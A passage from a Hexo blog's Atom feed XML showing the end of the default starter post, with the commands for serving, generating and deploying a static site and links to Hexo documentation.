server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
